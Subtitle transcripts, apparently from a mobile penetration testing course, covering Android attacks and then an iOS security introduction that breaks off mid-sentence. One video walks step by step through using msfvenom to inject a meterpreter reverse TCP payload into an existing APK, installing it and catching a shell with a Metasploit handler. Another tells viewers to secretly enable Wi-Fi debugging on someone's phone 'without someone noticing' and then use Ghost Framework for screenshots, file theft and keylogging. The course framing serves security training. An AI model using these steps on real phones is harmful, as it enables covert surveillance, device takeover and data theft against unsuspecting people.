a bit of troubleshooting to figure that one

26
00:00:57.970 --> 00:00:58.270
out.

27
00:00:58.530 --> 00:01:01.830
I found this part of the GitHub repo

28
00:01:01.830 --> 00:01:05.210
here about this issue where people were saying

29
00:01:05.210 --> 00:01:07.770
they were having this issue with apktool in

30
00:01:07.770 --> 00:01:11.630
Kali not being able to properly decode the

31
00:01:11.630 --> 00:01:12.210
application.

32
00:01:12.910 --> 00:01:14.590
And what the solution was, it's all the

33
00:01:14.590 --> 00:01:16.730
way here at the bottom, says you need

34
00:01:16.730 --> 00:01:20.970
to replace apktool-dirty with normal apktool.

35
00:01:21.190 --> 00:01:23.290
So you can actually just follow the instal

36
00:01:23.290 --> 00:01:24.010
instructions.

37
00:01:24.170 --> 00:01:25.910
First thing that you're going to need to

38
00:01:25.910 --> 00:01:29.410
do is just a sudo apt remove apktool.

39
00:01:29.510 --> 00:01:31.210
I'll just go through the steps to follow

40
00:01:31.210 --> 00:01:33.430
along in case you have this installed.

41
00:01:33.730 --> 00:01:36.250
So it's going to be sudo apt remove

42
00:01:37.820 --> 00:01:39.300
apktool.

43
00:01:41.080 --> 00:01:42.620
It's going to be just like that.

44
00:01:42.760 --> 00:01:44.020
For me it's going to say it's not

45
00:01:44.020 --> 00:01:46.260
installed because I did not instal this through

46
00:01:46.260 --> 00:01:47.280
the package manager.

47
00:01:49.020 --> 00:01:50.780
Then you're going to do a sudo apt

48
00:01:50.780 --> 00:01:51.400
auto remove.

49
00:01:51.500 --> 00:01:53.500
That's going to remove all the dependencies that

50
00:01:53.500 --> 00:01:54.980
were part of apktool.

51
00:01:55.300 --> 00:01:56.880
So again I would do the exact same

52
00:01:56.880 --> 00:01:57.220
thing.

53
00:01:57.580 --> 00:01:59.060
And then you're going to go to the

54
00:01:59.060 --> 00:02:01.720
ibotpeaches GitHub page and you're going to follow

55
00:02:01.720 --> 00:02:05.480
the instructions for how to instal this on

56
00:02:05.480 --> 00:02:06.500
Linux.

57
00:02:07.020 --> 00:02:09.400
So you're going to first download the Linux

58
00:02:09.400 --> 00:02:10.220
wrapper script.

59
00:02:10.600 --> 00:02:12.660
For example if I did this in my

60
00:02:12.660 --> 00:02:15.860
Kali machine I would just go to the

61
00:02:15.860 --> 00:02:18.040
apktool.ibotpeaches website.

62
00:02:25.370 --> 00:02:27.690
You just go in here, how to instal,

63
00:02:28.250 --> 00:02:33.610
right click this, click save link as, and

64
00:02:33.610 --> 00:02:35.590
it'll just save it as apktool in your

65
00:02:35.590 --> 00:02:36.130
downloads.

66
00:02:36.970 --> 00:02:38.550
Then you're going to do the same thing,

67
00:02:38.630 --> 00:02:40.150
download apktool2.

68
00:02:40.270 --> 00:02:41.230
I'm going to open that in a new

69
00:02:41.230 --> 00:02:45.230
tab and I picked apktool 2.6.1

70
00:02:45.230 --> 00:02:47.850
.jar and you're going to save that file

71
00:02:47.850 --> 00:02:48.530
as well.

72
00:02:49.310 --> 00:02:51.350
Now these will both be in our downloads,

73
00:02:51.510 --> 00:02:54.490
right, and we need to rename the apktool2

74
00:02:54.490 --> 00:02:58.470
.6.jar to just apktool.jar. So we're

75
00:02:58.470 --> 00:03:01.670
just going to do a cp apktool2.6

76
00:03:01.670 --> 00:03:06.250
.jar to apktool.jar. So just copying this

77
00:03:06.250 --> 00:03:09.370
file name to apktool.jar, do an ls

78
00:03:09.370 --> 00:03:12.610
here, now we can remove the apktool with

79
00:03:12.610 --> 00:03:17.490
the version number after it, just like that.

80
00:03:17.730 --> 00:03:19.450
Okay, so we just have these two files,

81
00:03:19.590 --> 00:03:21.530
right, and now what you can do is

82
00:03:21.530 --> 00:03:25.630
sudo cp, you're going to copy both these

83
00:03:25.630 --> 00:03:29.790
files over to user local bin.

84
00:03:29.990 --> 00:03:33.490
So just like this, user local bin, okay,

85
00:03:33.610 --> 00:03:35.670
and then you're going to do another command,

86
00:03:35.890 --> 00:03:41.470
so &&sudo copy apktool.jar to user

87
00:03:41.470 --> 00:03:43.430
local bin.

88
00:03:43.650 --> 00:03:45.490
Just like that, you can let that command

89
00:03:45.490 --> 00:03:48.150
fly and also make sure that you do

90
00:03:48.150 --> 00:03:50.450
a chmod on both of those files.

91
00:03:50.810 --> 00:03:52.230
So you can do that here in downloads

92
00:03:52.230 --> 00:03:54.870
file folder or you could do that in

93
00:03:54.870 --> 00:03:57.330
user local bin if you just navigate over

94
00:03:57.330 --> 00:03:58.610
to that directory, you need to make them

95
00:03:58.610 --> 00:03:59.650
executable as well.

96
00:03:59.910 --> 00:04:01.670
Just like how it shows in the instructions

97
00:04:01.670 --> 00:04:01.990
here.

98
00:04:02.170 --> 00:04:05.370
So you rename the downloaded jar to apktool

99
00:04:05.370 --> 00:04:09.350
.jar, move both files apktool.jar and apktool

100
00:04:09.350 --> 00:04:12.050
to user local bin, make sure both files

101
00:04:12.050 --> 00:04:15.290
are executable, chmod plus x, right, then you

102
00:04:15.290 --> 00:04:17.690
should be able to run apktool via the

103
00:04:17.690 --> 00:04:18.290
CLI.

104
00:04:18.790 --> 00:04:21.630
And to double check that this all installed

105
00:04:21.630 --> 00:04:27.250
properly, you can just do apktool-v or

106
00:04:27.510 --> 00:04:32.030
--version, apktool-version, and if it's 2

107
00:04:32.030 --> 00:04:34.530
.6.1 then you've done this successfully and

108
00:04:34.530 --> 00:04:37.450
replaced the apktool that comes with Kali Linux

109
00:04:37.450 --> 00:04:40.450
with the latest version of the apktool.

110
00:04:41.030 --> 00:04:44.130
Okay, so now how do we actually inject

111
00:04:44.130 --> 00:04:47.790
Meterpreter Payload into an existing application?

112
00:04:49.390 --> 00:04:51.730
Well, obviously all we can do is just

113
00:04:51.730 --> 00:04:54.150
download Injured Android from the app store, just

114
00:04:54.150 --> 00:04:55.770
like we've done throughout the course, right.

115
00:04:56.070 --> 00:04:57.390
So you can see that I have this

116
00:04:57.390 --> 00:04:58.230
app installed.

117
00:04:58.650 --> 00:05:00.910
Now I'm just going to do my adb

118
00:05:00.910 --> 00:05:03.130
shell, right, and pull this off of my

119
00:05:03.130 --> 00:05:03.450
phone.

120
00:05:03.990 --> 00:05:06.270
Now in this case, my emulator is running

121
00:05:06.270 --> 00:05:09.250
on my Windows machine and I have it

122
00:05:09.250 --> 00:05:11.710
networked using adb node-daemon-server, which I

123
00:05:11.710 --> 00:05:14.750
showed in the previous video on how to

124
00:05:14.750 --> 00:05:18.650
network your VM and also the emulator, right.

125
00:05:18.850 --> 00:05:23.710
So here, if you have the Android device

126
00:05:23.710 --> 00:05:26.010
connected directly to Kali Linux, your command would

127
00:05:26.010 --> 00:05:27.070
just be adb shell.

128
00:05:27.290 --> 00:05:29.150
In my case, I have the "-h", and

129
00:05:29.150 --> 00:05:33.550
the "-p", for connecting to my emulator on

130
00:05:33.550 --> 00:05:34.290
my host machine.

131
00:05:34.370 --> 00:05:35.370
So I'm just doing a shell.

132
00:05:35.530 --> 00:05:37.550
We're going to go in and pull the

133
00:05:37.550 --> 00:05:39.850
package off the phone, so this is pm

134
00:05:39.850 --> 00:05:44.210
list packages, right, and grep for Injured Android.

135
00:05:44.850 --> 00:05:47.010
Okay, and here's our package name, right.

136
00:05:48.920 --> 00:05:51.740
So we can just copy this, and then

137
00:05:51.740 --> 00:05:53.640
you can do a pm path, just like

138
00:05:53.640 --> 00:05:55.720
any app that would be pulling off the

139
00:05:55.720 --> 00:05:56.220
phone, right.

140
00:05:56.820 --> 00:05:59.020
So we have pm path, bnack-injured-android,

141
00:05:59.120 --> 00:06:00.820
here's our path to the apk.

142
00:06:02.240 --> 00:06:04.500
Okay, now I'm going to exit my shell,

143
00:06:05.000 --> 00:06:06.880
and I'm just going to download this right

144
00:06:06.880 --> 00:06:07.600
to this directory.

145
00:06:07.880 --> 00:06:11.240
So I'll do adb, and I'll do a

146
00:06:11.240 --> 00:06:15.780
pull, and pull that base.apk, and we'll

147
00:06:15.780 --> 00:06:19.040
name this injured.apk, just for easy naming.

148
00:06:19.680 --> 00:06:22.220
Okay, so we do an ls, and injured

149
00:06:22.220 --> 00:06:23.480
.apk is right here.

150
00:06:24.060 --> 00:06:25.720
All right, so how do we inject this

151
00:06:25.720 --> 00:06:29.660
into an interpreter payload, right.

152
00:06:29.840 --> 00:06:31.500
It's going to be very, very similar to

153
00:06:31.500 --> 00:06:33.000
what we did in the previous video.

154
00:06:33.700 --> 00:06:35.080
I'm just going to go up through my

155
00:06:35.080 --> 00:06:37.880
commands here, and then we'll walk through it

156
00:06:37.880 --> 00:06:39.060
as soon as I get back there.

157
00:06:39.760 --> 00:06:41.860
It's going to be just like this.

158
00:06:42.340 --> 00:06:45.620
So it's going to be msfvenom-x, and

159
00:06:45.620 --> 00:06:48.620
the dash x is the app that you're

160
00:06:48.620 --> 00:06:49.180
injecting.

161
00:06:49.300 --> 00:06:50.560
So in this case, it's just going to

162
00:06:50.560 --> 00:06:54.360
be injured.apk. Next is dash p, so

163
00:06:54.360 --> 00:06:55.660
this is our payload, which is going to

164
00:06:55.660 --> 00:06:58.380
be into android-interpreter-reverse-tcp.

165
00:06:58.880 --> 00:07:02.440
Then lhost equals whatever your Kali Linux IP

166
00:07:02.440 --> 00:07:05.700
address is, lport for whatever port you want

167
00:07:05.700 --> 00:07:08.160
it to be, and output in this case,

168
00:07:08.280 --> 00:07:13.440
we'll just call this injured.msf.apk, and

169
00:07:13.440 --> 00:07:15.620
now that we have apk tool installed to

170
00:07:15.620 --> 00:07:18.240
the latest versions, we can actually just press

171
00:07:18.240 --> 00:07:20.020
enter right on this, and it's going to

172
00:07:20.020 --> 00:07:23.740
generate the application, inject msfvenom, and all that

173
00:07:23.740 --> 00:07:24.340
good stuff.

174
00:07:24.560 --> 00:07:26.020
It's going to take just a few minutes

175
00:07:26.020 --> 00:07:27.520
to go through the process.

176
00:07:27.740 --> 00:07:28.700
We'll watch it go here.

177
00:07:29.040 --> 00:07:30.680
It's going to create your key in the

178
00:07:30.680 --> 00:07:31.200
key store.

179
00:07:31.480 --> 00:07:33.560
It's going to decompile the app, inject the

180
00:07:33.560 --> 00:07:37.880
meterpreter payload, and compile the app right into

181
00:07:37.880 --> 00:07:41.260
injured.msf.apk. Then we can just go

182
00:07:41.260 --> 00:07:43.260
ahead and instal that right onto the phone

183
00:07:43.260 --> 00:07:44.160
and run it.

184
00:07:46.330 --> 00:07:47.810
It's just going to take a couple more

185
00:07:47.810 --> 00:07:49.010
seconds to finish up here.

186
00:07:52.110 --> 00:07:54.790
Okay, it's zip aligning here, and now you

187
00:07:54.790 --> 00:07:57.410
can see it's saved as injured.msf.apk.

188
00:07:57.630 --> 00:08:01.010
So there is our new app, and all

189
00:08:01.010 --> 00:08:03.090
we need to do now is just uninstall

190
00:08:03.090 --> 00:08:03.810
the old one.

191
00:08:04.410 --> 00:08:06.290
Otherwise, we're going to have an issue when

192
00:08:06.290 --> 00:08:08.150
it says, you know, the app's already installed.

193
00:08:08.970 --> 00:08:13.090
Okay, and then just like anything else, installing

194
00:08:13.090 --> 00:08:14.870
a new app to the phone using adb,

195
00:08:15.170 --> 00:08:19.050
I can just do an adb instal, right,

196
00:08:19.410 --> 00:08:26.820
injured.msf.apk. Okay, and now it's successfully

197
00:08:26.820 --> 00:08:27.460
installed.

198
00:08:27.460 --> 00:08:29.240
The very last thing I need to do

199
00:08:29.240 --> 00:08:32.700
now is just start up MSF console with

200
00:08:32.700 --> 00:08:34.140
a multi-handler.

201
00:08:44.700 --> 00:08:46.400
Okay, so I'm just going to search for

202
00:08:46.400 --> 00:08:53.180
multi-handler, use option 5 here, show our

203
00:08:53.180 --> 00:08:53.720
options.

204
00:08:54.820 --> 00:08:57.880
Our L host is going to be our

205
00:08:57.880 --> 00:08:59.300
Kali Linux IP address.

206
00:08:59.460 --> 00:09:00.840
I'm just going to copy it from right

207
00:09:00.840 --> 00:09:15.890
over here, and

208
00:09:15.890 --> 00:09:18.030
our L port in this case was just

209
00:09:18.030 --> 00:09:18.750
446.

210
00:09:20.290 --> 00:09:21.650
Now we can click run.

211
00:09:22.590 --> 00:09:24.930
This will start up our reverse tcp handler,

212
00:09:25.290 --> 00:09:25.390
right.

213
00:09:26.030 --> 00:09:28.670
Our app should already be installed, and all

214
00:09:28.670 --> 00:09:30.250
we need to do is click the app,

215
00:09:30.910 --> 00:09:32.090
and there you go.

216
00:09:32.190 --> 00:09:33.590
You get your command shell back.

217
00:09:33.810 --> 00:09:35.490
Again, this is not going to work perfectly

218
00:09:35.490 --> 00:09:37.470
because it is running off an emulator from

219
00:09:37.470 --> 00:09:40.090
my Windows machine, but if you had a

220
00:09:40.090 --> 00:09:43.530
complete Android device, you should have a command

221
00:09:43.530 --> 00:09:46.190
shell now, and it'd be set up just

222
00:09:46.190 --> 00:09:46.650
that way.

223
00:09:47.090 --> 00:09:49.370
Now the very last resource I wanted to

224
00:09:49.370 --> 00:09:51.090
show you is how you can actually do

225
00:09:51.090 --> 00:09:51.790
this manually.

226
00:09:52.030 --> 00:09:56.010
There's a great article out there by Black

227
00:09:56.010 --> 00:09:57.870
Hills InfoSec.

228
00:09:58.230 --> 00:10:00.190
I definitely recommend reading through this.

229
00:10:00.310 --> 00:10:02.970
It actually teaches you how you can combine

230
00:10:02.970 --> 00:10:05.390
what we did in the previous video with

231
00:10:05.390 --> 00:10:09.110
this video, and how you can actually compile

232
00:10:09.110 --> 00:10:12.510
this application manually, change the smally code, and

233
00:10:12.510 --> 00:10:16.230
reference to your Metasploit payload, right.

234
00:10:16.550 --> 00:10:18.930
So I definitely recommend that you take a

235
00:10:18.930 --> 00:10:20.190
look at this as well so that you

236
00:10:20.190 --> 00:10:21.230
know how to do it manually.

237
00:10:21.390 --> 00:10:22.930
I just wanted to throw this out there

238
00:10:22.930 --> 00:10:25.790
as a resource that you can use in

239
00:10:25.790 --> 00:10:26.850
case you want to know how to do

240
00:10:26.850 --> 00:10:29.270
this manually as well, in case MSF Venom

241
00:10:29.270 --> 00:10:31.190
does not work properly for you.

242
00:10:31.410 --> 00:10:32.590
So thank you for watching.

243
00:10:32.710 --> 00:10:33.930
I hope that you're able to get a

244
00:10:33.930 --> 00:10:37.710
command shell on your Android machine, and see

245
00:10:37.710 --> 00:10:38.550
you in the next video.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:02.130
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Alright, welcome back to the next video on

2
00:00:02.130 --> 00:00:04.250
red teaming using Android devices.

3
00:00:04.570 --> 00:00:06.470
The next tool I want to show you

4
00:00:06.470 --> 00:00:08.390
is something called Ghost Framework.

5
00:00:08.470 --> 00:00:10.150
You can look in the description, the notes

6
00:00:10.150 --> 00:00:11.410
for the URL.

7
00:00:12.170 --> 00:00:15.430
Ghost Framework is essentially used with the ADB

8
00:00:15.430 --> 00:00:18.750
debug bridge to give you access to an

9
00:00:18.750 --> 00:00:19.670
Android device.

10
00:00:20.010 --> 00:00:21.790
So the use case I could see for

11
00:00:21.790 --> 00:00:24.310
this is if you just had access to

12
00:00:24.310 --> 00:00:26.490
a device for a minute or two, right?

13
00:00:26.990 --> 00:00:29.150
If you're able to grab a device, right?

14
00:00:29.150 --> 00:00:31.830
If you can go into the settings, just

15
00:00:31.830 --> 00:00:32.970
look at this emulator here.

16
00:00:33.890 --> 00:00:38.950
If you can go into the settings, go

17
00:00:38.950 --> 00:00:42.070
all the way down to system or about

18
00:00:42.070 --> 00:00:42.950
the device, right?

19
00:00:43.890 --> 00:00:47.070
And you have time to get in here,

20
00:00:47.970 --> 00:00:49.850
click the build number eight times.

21
00:00:50.350 --> 00:00:51.470
You are now a developer.

22
00:00:52.330 --> 00:00:54.710
This will open the developer settings, right?

23
00:00:54.850 --> 00:00:59.190
Under system here, developer options, and when you

24
00:00:59.190 --> 00:01:01.250
have a physical device, there's going to be

25
00:01:01.250 --> 00:01:03.550
another option here that is not shown on

26
00:01:03.550 --> 00:01:04.209
this emulator.

27
00:01:04.810 --> 00:01:07.690
So there's USB debugging, we can enable that.

28
00:01:07.970 --> 00:01:09.930
This will allow us to debug from our

29
00:01:09.930 --> 00:01:12.510
host machine or also, if we open that

30
00:01:12.510 --> 00:01:13.990
port like I did with the no daemon

31
00:01:13.990 --> 00:01:14.630
server, right?

32
00:01:15.110 --> 00:01:17.890
On a physical phone, there's also another switch

33
00:01:17.890 --> 00:01:21.170
here for Wi-Fi debugging, to enable Wi

34
00:01:21.170 --> 00:01:21.750
-Fi debugging.

35
00:01:21.750 --> 00:01:24.470
So if you can enable that switch and

36
00:01:24.470 --> 00:01:26.930
hop back really quick, you know, to the

37
00:01:26.930 --> 00:01:31.470
Wi-Fi settings, grab the IP address, which

38
00:01:31.470 --> 00:01:33.030
in our case is just going to be

39
00:01:33.670 --> 00:01:35.230
like an emulator IP, right?

40
00:01:35.650 --> 00:01:38.130
So 10.0.2.16. If you're able

41
00:01:38.130 --> 00:01:40.130
to get all that information within a minute

42
00:01:40.130 --> 00:01:42.570
or two without someone noticing, and you know

43
00:01:42.570 --> 00:01:43.770
that this person is always going to be

44
00:01:43.770 --> 00:01:45.470
coming back to the same network, right?

45
00:01:45.470 --> 00:01:46.770
They're probably going to be getting a static

46
00:01:46.770 --> 00:01:47.570
IP address.

47
00:01:47.570 --> 00:01:50.510
This could be a reliable way for you

48
00:01:50.510 --> 00:01:53.030
to have some persistence onto their device.

49
00:01:53.610 --> 00:01:55.450
So assuming you were able to go through

50
00:01:55.450 --> 00:01:59.110
all those steps with someone's phone, next you

51
00:01:59.110 --> 00:02:01.190
can go ahead and get started with Ghost

52
00:02:01.190 --> 00:02:01.810
Framework.

53
00:02:02.050 --> 00:02:03.570
I'm not going to show this on a

54
00:02:03.570 --> 00:02:05.530
physical device because I don't have an extra

55
00:02:05.530 --> 00:02:07.410
one to spare, but I just want to

56
00:02:07.410 --> 00:02:09.090
show you the concept and the tool.

57
00:02:09.710 --> 00:02:11.470
So Ghost Framework is right here.

58
00:02:11.690 --> 00:02:13.670
It's kind of an interesting little tool.

59
00:02:14.450 --> 00:02:16.050
It's pretty easy to set up.

60
00:02:16.330 --> 00:02:17.630
So if we wanted to do that with

61
00:02:17.630 --> 00:02:19.890
a Kali box, all we have to do

62
00:02:19.890 --> 00:02:22.670
is go to Google and search for Ghost

63
00:02:22.670 --> 00:02:23.470
Framework, right?

64
00:02:24.390 --> 00:02:28.250
And copy the repo from GitHub, and it's

65
00:02:28.250 --> 00:02:30.210
going to be this ghost-1 here.

66
00:02:30.750 --> 00:02:32.530
So I could just copy this code right

67
00:02:32.530 --> 00:02:37.070
here, do a git clone with our URL,

68
00:02:37.710 --> 00:02:40.170
and in my case, I do already have

69
00:02:40.170 --> 00:02:40.410
this.

70
00:02:40.510 --> 00:02:41.770
So if I just do an ls, you'll

71
00:02:41.770 --> 00:02:42.930
see that ghost-1 is here.

72
00:02:42.930 --> 00:02:45.850
So you just cd into ghost-1, do

73
00:02:45.850 --> 00:02:47.310
an ls here, and all you need to

74
00:02:47.310 --> 00:02:52.230
do is do a sudo ./.install.sh. Here

75
00:02:52.230 --> 00:02:53.690
it's going to prompt me for my Kali

76
00:02:53.690 --> 00:02:54.270
password.

77
00:02:54.930 --> 00:02:56.730
It's going to install the dependencies if you've

78
00:02:56.730 --> 00:02:57.630
not done this already.

79
00:02:58.490 --> 00:03:00.690
It takes about maybe two minutes to install

80
00:03:00.690 --> 00:03:01.510
all those dependencies.

81
00:03:01.850 --> 00:03:03.290
In my case, everything's already done.

82
00:03:03.810 --> 00:03:05.190
So I'll do an ls again.

83
00:03:05.370 --> 00:03:07.190
How we actually run the Ghost Framework is

84
00:03:07.190 --> 00:03:11.210
just do ./.ghost here, and now this works

85
00:03:11.210 --> 00:03:13.230
very similarly to Metasploit.

86
00:03:13.850 --> 00:03:15.310
So we're going to set our rhost.

87
00:03:16.070 --> 00:03:18.310
In my case, it's just 10.0.2

88
00:03:18.310 --> 00:03:21.290
.16, and this is not going to work,

89
00:03:21.550 --> 00:03:23.570
but this is what you would do if

90
00:03:23.570 --> 00:03:25.910
you, you know, had that access to a

91
00:03:25.910 --> 00:03:27.850
physical device, and you were able to hit

92
00:03:27.850 --> 00:03:29.850
it over Wi-Fi or, you know, had

93
00:03:29.850 --> 00:03:30.510
a static IP.

94
00:03:31.770 --> 00:03:33.630
So you just set rhost like this, and

95
00:03:33.630 --> 00:03:35.530
then you can just go and do run.

96
00:03:35.690 --> 00:03:37.490
Now you're gonna get a prompt onto that

97
00:03:37.490 --> 00:03:39.230
Android device that's going to say, do you

98
00:03:39.230 --> 00:03:40.370
want to enable debugging?

99
00:03:40.850 --> 00:03:42.910
So if you have time before handing the

100
00:03:42.910 --> 00:03:45.290
device back to the victim, that's where you'd

101
00:03:45.290 --> 00:03:46.870
want to accept that so you can have

102
00:03:46.870 --> 00:03:47.570
this persistence.

103
00:03:48.010 --> 00:03:49.310
Now, of course, I'm going to get a

104
00:03:49.310 --> 00:03:51.830
fail to connect because my Kali box here

105
00:03:51.830 --> 00:03:55.170
is not connected to my emulator, but what

106
00:03:55.170 --> 00:03:57.190
you can do now after you've gotten to

107
00:03:57.190 --> 00:03:58.970
that point with the Ghost Framework, if we

108
00:03:58.970 --> 00:04:01.170
go into the modules here, this is all

109
00:04:01.170 --> 00:04:02.130
the things that you can do.

110
00:04:02.350 --> 00:04:04.790
So there's an activity.py. This allows you

111
00:04:04.790 --> 00:04:06.750
to open activities of apps.

112
00:04:06.750 --> 00:04:09.250
Battery.py. This tells you like the battery

113
00:04:09.250 --> 00:04:09.750
status.

114
00:04:10.270 --> 00:04:12.310
You can download files off of the phone.

115
00:04:12.810 --> 00:04:14.530
You can do a screenshot of whatever's on

116
00:04:14.530 --> 00:04:15.790
the phone if you think they have something

117
00:04:15.790 --> 00:04:16.810
sensitive pulled up.

118
00:04:17.190 --> 00:04:19.230
There's screen.py, which actually allows you to

119
00:04:19.230 --> 00:04:20.350
control the screen.

120
00:04:21.310 --> 00:04:23.210
Shell.py, which drops you into a normal

121
00:04:23.210 --> 00:04:25.010
ADB shell that could be used throughout the

122
00:04:25.010 --> 00:04:25.330
course.

123
00:04:25.850 --> 00:04:27.830
Upload.py, so you can upload files.

124
00:04:27.950 --> 00:04:29.650
You can get system info, Wi-Fi.

125
00:04:30.070 --> 00:04:33.510
You can even do keyboard and do some

126
00:04:33.510 --> 00:04:35.810
key logging with this tool.

127
00:04:36.270 --> 00:04:38.730
So definitely something interesting with quite a bit

128
00:04:38.730 --> 00:04:39.270
of features.

129
00:04:39.510 --> 00:04:41.130
I definitely recommend looking into it.

130
00:04:41.330 --> 00:04:44.250
If you do have a extra physical device

131
00:04:44.250 --> 00:04:45.650
that you can use on the same Wi

132
00:04:45.650 --> 00:04:47.330
-Fi network, or you can find some way

133
00:04:47.330 --> 00:04:49.810
to enable that Wi-Fi setting on an

134
00:04:49.810 --> 00:04:52.050
emulator, then go ahead and play with the

135
00:04:52.050 --> 00:04:52.730
Ghost Framework.

136
00:04:52.750 --> 00:04:54.230
It's pretty interesting to use.

137
00:04:54.430 --> 00:04:55.790
I used it a few times in the

138
00:04:55.790 --> 00:04:57.790
past just to mess around with it.

139
00:04:57.870 --> 00:04:59.390
It's really fun to be able to take

140
00:04:59.390 --> 00:05:01.730
screenshots as you're going through and everything like

141
00:05:01.730 --> 00:05:02.050
that.

142
00:05:02.390 --> 00:05:04.070
So I hope you find this tool useful.

143
00:05:04.290 --> 00:05:05.550
All the links are in the descriptions.

144
00:05:05.910 --> 00:05:07.190
I'll see you in the next videos.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 9: iOS-Introduction-and-Architecture

WEBVTT

1
00:00:00.070 --> 00:00:02.890
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's get started into the iOS penetration

2
00:00:02.890 --> 00:00:05.090
testing portion of this course.

3
00:00:05.470 --> 00:00:07.230
Now I just want to remind you again

4
00:00:07.230 --> 00:00:10.530
that the device requirements for this section of

5
00:00:10.530 --> 00:00:13.130
the course is a MacBook or Apple device

6
00:00:13.130 --> 00:00:16.870
with macOS, Catalina or Big Sur, and also

7
00:00:16.870 --> 00:00:20.490
a physical iPhone or iPad running iOS 14

8
00:00:20.490 --> 00:00:21.930
.7 or less.

9
00:00:22.470 --> 00:00:24.470
Again, we're going to be jailbreaking a device

10
00:00:24.470 --> 00:00:26.330
in this section of the course, which is

11
00:00:26.330 --> 00:00:28.550
why we're going to require a physical device.

12
00:00:29.930 --> 00:00:33.010
Let's move on and talk about some of

13
00:00:33.010 --> 00:00:34.770
the basics of iOS security.

14
00:00:35.330 --> 00:00:38.250
So iOS devices are kind of naturally limited

15
00:00:38.250 --> 00:00:39.970
when compared to Android.

16
00:00:40.330 --> 00:00:43.370
It's much more difficult to install an application

17
00:00:43.370 --> 00:00:46.650
from outside of the Apple Store compared to

18
00:00:46.650 --> 00:00:49.190
trying to install applications from outside of the

19
00:00:49.190 --> 00:00:50.010
Google Play Store.

20
00:00:50.570 --> 00:00:52.530
Apple tries to keep this thing that people

21
00:00:52.530 --> 00:00:55.570
refer to as a walled garden of the

22
00:00:55.570 --> 00:00:58.910
applications you can install and utilize, right?

23
00:00:59.370 --> 00:01:02.550
So Apple has all their applications are signed

24
00:01:02.550 --> 00:01:05.150
by them and approved to be on the

25
00:01:05.150 --> 00:01:07.750
Apple Store and is really not intended to

26
00:01:07.750 --> 00:01:10.810
install applications from outside of the Apple Store.

27
00:01:11.370 --> 00:01:12.790
Now in this course, we're going to be

28
00:01:12.790 --> 00:01:14.910
bypassing this by using jailbreaking.

29
00:01:15.430 --> 00:01:18.270
But the other way of installing applications is

30
00:01:18.270 --> 00:01:21.150
via side loading, which can be achieved via

31
00:01:21.150 --> 00:01:21.850
Xcode.

32
00:01:22.230 --> 00:01:25.170
So Xcode is the development environment for iOS

33
00:01:25.170 --> 00:01:26.030
applications.

34
00:01:26.570 --> 00:01:29.510
And when we have an Xcode development license,

35
00:01:29.630 --> 00:01:32.170
it's going to allow us to side load

36
00:01:32.170 --> 00:01:34.330
the applications that we build and load it

37
00:01:34.330 --> 00:01:35.290
onto our iPhone.

38
00:01:35.830 --> 00:01:38.070
So basically, there's two different ways of installing

39
00:01:38.070 --> 00:01:40.770
other iOS applications onto our phone.

40
00:01:41.050 --> 00:01:43.330
One is side loading and the other is

41
00:01:43.330 --> 00:01:47.330
using jailbreaking to install third party applications.

42
00:01:48.110 --> 00:01:49.670
One thing to keep in mind that's really

43
00:01:49.670 --> 00:01:52.470
special about Apple devices in general is that

44
00:01:52.470 --> 00:01:55.630
many iOS and Apple devices actually have a

45
00:01:55.630 --> 00:01:57.290
hardware security component.

46
00:01:58.150 --> 00:02:01.610
And recently, in recent years, with new iPhones

47
00:02:01.610 --> 00:02:05.090
and everything like that, even installing a new

48
00:02:05.090 --> 00:02:08.430
camera or some type of hardware to the

49
00:02:08.430 --> 00:02:10.850
device, like let's say a new microphone, it

50
00:02:10.850 --> 00:02:14.010
can actually cause the iPhone to crash and

51
00:02:14.010 --> 00:02:15.270
not allow it to work.

52
00:02:15.710 --> 00:02:18.470
So the actual hardware on the phone itself

53
00:02:18.470 --> 00:02:21.450
is actually signed to the device.

54
00:02:22.010 --> 00:02:25.750
So not only is there some hardware security

55
00:02:25.750 --> 00:02:29.130
components for the device in general, but also

56
00:02:29.130 --> 00:02:33.010
the hardware that is installed onto the device,

57
00:02:33.090 --> 00:02:35.930
like your camera, your microphone, etc.

58
00:02:36.250 --> 00:02:40.210
also has an actual signing process that ensures

59
00:02:40.210 --> 00:02:44.710
that that microphone or component actually belongs to

60
00:02:44.710 --> 00:02:45.910
the device directly.

61
00:02:46.850 --> 00:02:49.850
So here is the iOS security architecture.

62
00:02:50.190 --> 00:02:52.530
On the right hand side, this is a

63
00:02:52.530 --> 00:02:54.830
picture, you can see that there's actually a

64
00:02:54.830 --> 00:02:58.150
hardware and a firmware layer, and also a

65
00:02:58.150 --> 00:02:59.010
software layer.

66
00:03:00.050 --> 00:03:04.090
So there's kind of this hardware layer that

67
00:03:04.090 --> 00:03:07.130
does not necessarily exist in Android phones.

68
00:03:07.450 --> 00:03:09.570
With certain types of Android phones, I'm sure

69
00:03:09.570 --> 00:03:11.770
there is actually a hardware security layer.

70
00:03:12.130 --> 00:03:15.550
But generally speaking for Android overall, there's not

71
00:03:15.550 --> 00:03:17.750
really this layer where we're going to be

72
00:03:17.750 --> 00:03:21.370
having our like Apple root certificate and our

73
00:03:21.370 --> 00:03:25.090
special keys and everything that are actually manufactured

74
00:03:25.090 --> 00:03:27.230
into the device at a hardware level.

75
00:03:27.910 --> 00:03:29.750
So again, there's two layers to the iOS

76
00:03:29.750 --> 00:03:32.050
security architecture, we have a hardware layer and

77
00:03:32.050 --> 00:03:32.950
our software layer.

78
00:03:33.450 --> 00:03:37.030
And again, similarly to Android, applications are run

79
00:03:37.030 --> 00:03:39.130
in their own sandboxed environment.

80
00:03:39.670 --> 00:03:42.370
So similar to Android, everything is based on

81
00:03:42.370 --> 00:03:42.770
Unix.

82
00:03:43.170 --> 00:03:44.910
Later in this course, we will actually get

83
00:03:44.910 --> 00:03:46.990
a shell into our iPhone, and you'll see

84
00:03:46.990 --> 00:03:49.490
that it's just a Linux shell again, which

85
00:03:49.490 --> 00:03:54.490
means that applications are also assigned folders similarly

86
00:03:54.490 --> 00:03:56.510
to how they are in Android.

87
00:03:57.030 --> 00:04:00.910
Now a slight difference to Android is that

88
00:04:00.910 --> 00:04:03.810
all apps are actually signed by Apple themselves.

89
00:04:04.450 --> 00:04:06.370
And to be able to sign an application

90
00:04:06.370 --> 00:04:08.670
successfully and get it to run on iPhone,

91
00:04:09.110 --> 00:04:11.150
